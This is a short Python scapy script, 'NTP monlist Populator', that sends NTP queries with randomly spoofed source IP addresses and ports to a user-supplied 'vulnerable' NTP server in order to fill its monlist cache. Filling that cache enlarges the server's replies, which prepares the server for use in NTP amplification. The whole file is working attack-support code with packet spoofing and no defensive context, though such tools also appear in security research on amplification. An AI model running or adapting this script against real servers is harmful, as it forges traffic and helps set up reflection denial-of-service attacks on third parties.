#!/usr/bin/python
from scapy.all import *
from random import randrange
import sys , os

SCRIPTNAME = os.path.basename(__file__)

def randomIP(): #Credits: http://www.codingwithcody.com/2010/05/generate-random-ip-with-python/
        not_valid = [10,127,169,172,192]
        first = randrange(1,256)
        while first in not_valid:
                first = randrange(1,256)
        ip = ".".join([str(first),str(randrange(1,256)),str(randrange(1,256)),str(randrange(1,256))])
        return ip

def about():
        print(''' 
        NTP 'monlist' Populator v1.0
        Script to populate the NTP servers 'monlist' cache
        Dependencies: pip install scapy
        Developed by: Wasim Halani http://securitythoughts.wordpress.com/''')
        sys.exit()

def usage():
        print(''' 
        Dependencies: pip install scapy
        Usage: '''+SCRIPTNAME+''' <ip_address_of_vulnerable_ntp_server>
        ''')
        sys.exit()



if __name__ == "__main__":
        if len(sys.argv) == 1:
                usage()
        elif len(sys.argv) == 2:
                srcAddr=randomIP()
                dstAddr=sys.argv[1]
                srcPort=randrange(1,65535)
                dstPort=123
                ntpDateQuery = '\x1b' + 47 * '\0' # https://www.safaribooksonline.com/library/view/python-cookbook-2nd/0596007973/ch13s05.html
                send(IP(src=srcAddr,dst=dstAddr)/UDP(sport=srcPort,dport=dstPort)/Raw(load=ntpDateQuery))
                print '[+] NTPDate: '+srcAddr+':'+str(srcPort)+' --> '+dstAddr+':'+str(dstPort)

